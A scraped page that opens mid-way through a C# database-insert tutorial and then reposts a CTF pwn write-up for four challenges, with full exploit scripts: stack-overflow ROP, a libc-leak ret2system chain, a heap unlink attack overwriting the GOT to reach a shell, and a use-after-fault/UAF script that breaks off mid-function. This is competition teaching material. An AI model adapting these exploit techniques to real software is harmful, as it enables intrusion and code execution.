            //<span class="number">5</span>&amp;<span class="symbol">#x5904</span>;&amp;<span class="symbol">#x7406</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;
           if (result &amp;gt; <span class="number">0</span>)
           {
               <span class="class">Console</span>.<span class="class">WriteLine</span>(&amp;quot;&amp;<span class="symbol">#x63D2</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;quot;);
           }
           else
           {
               <span class="class">Console</span>.<span class="class">WriteLine</span>(&amp;quot;&amp;<span class="symbol">#x63D2</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;quot;);
           }  
        //<span class="number">6</span>&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5DEE</span>;&amp;<span class="symbol">#x70B9</span>;&amp;<span class="symbol">#x5FD8</span>;&amp;<span class="symbol">#x8BB0</span>;&amp;<span class="symbol">#x4E86</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x5173</span>;&amp;<span class="symbol">#x95ED</span>;&amp;<span class="symbol">#x8FDE</span>;&amp;<span class="symbol">#x63A5</span>;  
        scon.<span class="class">Close</span>();
           <span class="class">Console</span>.<span class="class">ReadKey</span>();
        }
    }
}
</code></pre><p>&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x73A9;&#x4E4B;&#x540E;&#x7684;&#x6548;&#x679C;&#x56FE;&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/YFRVnq.jpg" alt=""></p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/a6ZrA3M">&#x5BF9;datagridview&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;(B)</a></li>
<li>2.<a href="/articles/ZNVBfiu">Datazen&#x914D;&#x7F6E;</a></li>
<li>3.<a href="/articles/R7z67zJ">RMAN&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D; &#x2014;&#x2014; &#x53C2;&#x6570;&#x6587;&#x4EF6;&#x8FD8;&#x539F;</a></li>
<li>4.<a href="/articles/uQ7J32Q">&#x8FDC;&#x7A0B;&#x642D;&#x5EFA;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x73AF;&#x5883;&#x9047;&#x5230;&#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;</a></li>
<li>5.<a href="/articles/6VB7zii">Datazen&#x5B89;&#x88C5;</a></li>
<li><p>6.<a href="/articles/eUfI3m6">&#x6211;&#x7684;MYSQL&#x5B66;&#x4E60;&#x5FC3;&#x5F97;&#xFF08;16&#xFF09; &#xFF1A; &#x4F18;&#x5316;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/z6naAjB">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;z6naAjB&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/数据库/">数据库</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/6662e86/" title="“强网杯”网络安全挑战赛WriteUp -" itemprop="url">“强网杯”网络安全挑战赛WriteUp -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp">&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:53:20  <a href="/sites/MNnABb">FreeBuf</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.freebuf.com/articles/web/69260.html?utm_source=tuicool" target="_blank" rel="external">http://www.freebuf.com/articles/web/69260.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/10000101">&#x7F51;&#x7EDC;&#x5B89;&#x5168;</a><a href="/topics/11100078">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</a></p>
<p>  &#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x6311;&#x6218;&#x8D5B;&#x662F;&#x9762;&#x5411;&#x56FD;&#x5185;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x4F01;&#x4E1A;&#xFF08;&#x56E2;&#x961F;&#xFF09;&#x548C;&#x9AD8;&#x7B49;&#x9662;&#x6821;&#x7684;&#x56FD;&#x5BB6;&#x7EA7;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x8D5B;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x7B2C;&#x4E8C;&#x5C4A;&#x56FD;&#x5BB6;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x5BA3;&#x4F20;&#x5468;&#x7684;&#x91CD;&#x8981;&#x6D3B;&#x52A8;&#x4E4B;&#x4E00;&#x3002;</p>
<h4 id="Guess">Guess</h4><h4 id="&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;">&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;</h4><p>&#x7A0B;&#x5E8F;&#x662F;&#x4E2A;&#x6309;&#x56FE;&#x56DE;&#x7B54;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x6E38;&#x620F;&#x901A;&#x5173;&#x540E;&#x4F1A;&#x8BA9;&#x8F93;&#x5165;&#x90AE;&#x7BB1;&#xFF0C;&#x4F1A;&#x6253;&#x5370;</p>
<p>Thank you so much! I will send you a gift, bye!</p>
<p>&#x6700;&#x5F00;&#x59CB;&#x624B;&#x8BD5;&#x4E86;&#x4E24;&#x628A;&#xFF0C;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x90AE;&#x7BB1;&#xFF0C;&#x4F46;&#x662F;flag&#x90FD;&#x6CA1;&#x6709;&#x53D1;&#x5230;&#x90AE;&#x7BB1;&#x91CC;&#x3002;</p>
<p>&#x4ED4;&#x7EC6;&#x770B;&#x7A0B;&#x5E8F;&#xFF0C;&#x624D;&#x53D1;&#x73B0;&#x662F;&#x4E2A;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://img2.tuicool.com/AbYb6ju.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x8981;&#x62FF;shell&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x4E0D;&#x8FC7;&#x7A0B;&#x5E8F;&#x4E2D;&#x6709;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#xFF0C;</p>
<p><img src="http://img1.tuicool.com/JryEBzf.jpg" alt=""></p>
<p>&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x6784;&#x9020;rop&#x53BB;&#x8BFB;&#x53D6;flag&#x6587;&#x4EF6;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;">&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;</h4><pre><code>from zio <span class="built_in">import</span> <span class="built_in">*</span>
target = <span class="params">(&amp;apos;<span class="number">119.254</span>.<span class="number">101.197</span>&amp;apos;,<span class="number">10000</span>)</span>
<span class="built_in">#</span>target = &amp;apos;./guess&amp;apos;
def <span class="built_in">exp</span><span class="params">(target)</span>:
    io = zio<span class="params">(target, timeout=<span class="number">10000</span>, print_read=COLORED<span class="params">(RAW, &amp;apos;red&amp;apos;)</span>, print_write=COLORED<span class="params">(RAW, &amp;apos;green&amp;apos;)</span>)</span>
    io.gdb_hint<span class="params">()</span>
    d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
    addr = <span class="number">0</span>x08048830
    io.writeline<span class="params">(&amp;apos;a&amp;apos;*<span class="number">0</span>x9c+l32<span class="params">(addr)</span>+l32<span class="params">(<span class="number">0</span>)</span>+l32<span class="params">(<span class="number">0</span>x0804A100)</span>)</span>
    io.read_until<span class="params">(&amp;apos;!\n&amp;apos;)</span>
    <span class="built_in">#</span><span class="keyword">for</span> i in range<span class="params">(<span class="number">9</span>)</span>:
    <span class="keyword">for</span> i in range<span class="params">(<span class="number">5</span>)</span>:
        d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
        <span class="keyword">if</span> &amp;apos;quu&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;pikachu&amp;apos;)</span>
        elif &amp;apos;COOL&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;peanuts&amp;apos;)</span>
        elif &amp;apos;bug&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;batman&amp;apos;)</span>
        elif &amp;apos;<span class="number">88888888888</span>&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;linux&amp;apos;)</span>
        elif &amp;apos;==o==&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;superman&amp;apos;)</span>
    io.read_until<span class="params">(&amp;apos;email:&amp;apos;)</span>
    io.writeline<span class="params">(&amp;apos;flag&amp;apos;)</span>
    io.interact<span class="params">()</span>
<span class="built_in">exp</span><span class="params">(target)</span>
</code></pre><h4 id="urldecoder">urldecoder</h4><p>&#x5728;url&#x89E3;&#x7801;&#x51FD;&#x6570;&#x4E2D;&#x867D;&#x7136;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x8FC7;&#x5BF9;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x505A;&#x4E25;&#x683C;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E2D;&#x653E;&#x4E00;&#x4E2A;\x00&#x7ED5;&#x8FC7;strlen&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x4ECE;&#x800C;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://img2.tuicool.com/ieAzUr.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/vuUBBn.jpg" alt=""></p>
<pre><code>&amp;#x811A<span class="comment">;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10001)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./urldecoder&amp;apos;</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     pop_ebp_ret    = <span class="number">0</span>x080488D2
     puts_plt = <span class="number">0</span>x08048530
     puts_got = <span class="number">0</span>x08049DE8
     read_fun = <span class="number">0</span>x08048720
     main = <span class="number">0</span>x08048590
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(puts_plt) + l32(pop_ebp_ret) + l32(puts_got)</span>
     payload += l32<span class="list">(<span class="keyword">main</span>)</span>
     payload += <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;)</span>
     puts_addr = l32<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">4</span>)</span>)</span>
     print hex<span class="list">(<span class="keyword">puts_addr</span>)</span>
     libc_base = puts_addr - <span class="number">0</span>x00065650
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     system_addr = libc_base + <span class="number">0</span>x00040190
     binsh_addr = libc_base + <span class="number">0</span>x00160A24
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(system_addr) + l32(pop_ebp_ret) + l32(binsh_addr)</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span>
</code></pre><h4 id="shellman">shellman</h4><p>&#x5728;edit&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x5224;&#x65AD;&#xFF0C;&#x5B58;&#x5728;&#x5806;&#x6EA2;&#x51FA;</p>
<p><img src="http://img0.tuicool.com/3IrIne2.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-1">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x53C2;&#x8003;&#x4E86;217&#x7684;0ctf freenote&#x7684;writeup&#x4E2D;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x901A;&#x8FC7;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x4FEE;&#x6539;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x7684;size&#x5B57;&#x8282;&#x4E2D;&#x7684;prev_inuse&#x6BD4;&#x7279;&#x4F4D;&#xFF0C;&#x8BA9;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x8BEF;&#x8BA4;&#x4E3A;&#x5176;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x5904;&#x4E8E;&#x7A7A;&#x95F2;&#x6001;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5728;free &#x4E0B;&#x4E00;&#x5757;&#x5806;&#x65F6;&#xFF0C;&#x540E;&#x8C03;&#x7528;unlink&#x3002;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x7684;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x7ED3;&#x6784;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;bss&#x8282;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;edit&#x548C;show&#x529F;&#x80FD;&#xFF0C;&#x5B9E;&#x73B0;&#x5185;&#x5B58;&#x7684;&#x4EFB;&#x610F;&#x8BFB;&#x5199;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;, 10002)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./shellman&amp;apos;</span>
def new_sc<span class="list">(<span class="keyword">io</span>, sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">sc</span>)</span>
def edit_sc<span class="list">(<span class="keyword">io</span>, index, new_sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">new_sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">new_sc</span>)</span>
def delete_sc<span class="list">(<span class="keyword">io</span>, index)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
def list_sc<span class="list">(<span class="keyword">io</span>)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;SHELLC0DE 0: &amp;apos;)</span>
    return l64<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">16</span>)</span>.decode<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;hex&amp;apos;))</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
    #io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">REPR</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(REPR, &amp;apos;green&amp;apos;))</span>
    io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0xa0) #0x603010</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;b&amp;apos;*0xa0) #0x6030c0</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos;+&amp;apos;c&amp;apos;*0x98) #0x603170</span>
    ptr_addr = <span class="number">0</span>x00000000006016d0
    #                              rax                  rdx
    payload = l64<span class="list">(<span class="number">0</span>)</span> + l64<span class="list">(<span class="number">0</span>xa1)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x18</span>)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x10</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0x80 + l64(0xa0) + l64(0xb0)</span>
    edit_sc<span class="list">(<span class="keyword">io</span>, <span class="number">0</span>, payload)</span> # change <span class="variable">*0x6016d0 = 0x6016b8
    delete_sc(io, 1)
    free_got = 0x0000000000601600
    payload2 = l64(0) + l64(1) +l64(0xa0) + l64(free_got)
    edit_sc(io, 0, payload2)
    free_addr = list_sc(io)
    print hex(free_addr)
    #local
    &amp;apos;&amp;apos;&amp;apos;
    system_addr = 0x00007FFFF7A5B640
    &amp;apos;&amp;apos;&amp;apos;
    libc_base = free_addr - 0x0000000000082DF0
    system_addr = libc_base + 0x0000000000046640
    edit_sc(io, 0, l64(system_addr))
    delete_sc(io, 2)
    io.interact()
exp(target)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="imdb">imdb</h4><h4 id="&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;">&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;</h4><p>&#x5728;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x540C;&#x540D;&#x7684;&#x5168;&#x90E8;&#x5220;&#x9664;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x4F1A;&#x5C06;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x7684;&#x6307;&#x9488;&#x6E05;0&#xFF0C;&#x5B58;&#x5728;uaf&#x6F0F;&#x6D1E;&#x3002;</p>
<p><img src="http://img0.tuicool.com/7b2UnmF.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/zIBzQbf.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-2">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x56E0;&#x4E3A;movie&#x548C;tv&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x524D;4&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x4E2A;&#x865A;&#x8868;&#x6307;&#x9488;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x3002;&#x4E0D;&#x8FC7;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x4F2A;&#x9020;&#x7684;&#x865A;&#x8868;&#x4E5F;&#x53EA;&#x80FD;&#x653E;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x8981;&#x60F3;&#x83B7;&#x53D6;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;&#x6CC4;&#x9732;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x5F97;&#x5230;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x6240;&#x5728;&#x5730;&#x5740;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x62FF;shell&#x8FD8;&#x9700;&#x8981;&#x83B7;&#x53D6;libc&#x5E93;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;&#x3002;</p>
<p>&#x5229;&#x7528;&#x6253;&#x5370;movie&#x4E2D;&#x7684;actors&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x53D6;&#x3002;</p>
<p><img src="http://img0.tuicool.com/iu22EnM.jpg" alt=""></p>
<p>&#x8FD9;&#x9053;&#x9898;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x4E0D;&#x8FC7;&#x6839;&#x636E;&#x6CC4;&#x9732;&#x7684;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x7528;&#x7684;&#x5E93;&#x548C;shellman&#x662F;&#x540C;&#x4E00;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x6709;libc&#x5E93;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x7684;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10003)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./imdb&amp;apos;</span>
def add_tv<span class="list">(<span class="keyword">io</span>, name, session, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">session</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def add_movie<span class="list">(<span class="keyword">io</span>, name, actors, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">actors</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def remove_entry<span class="list">(<span class="keyword">io</span>, name)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
def show_all<span class="list">(<span class="keyword">io</span>)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     malloc_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
     print hex<span class="list">(<span class="keyword">malloc_addr</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     heap_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
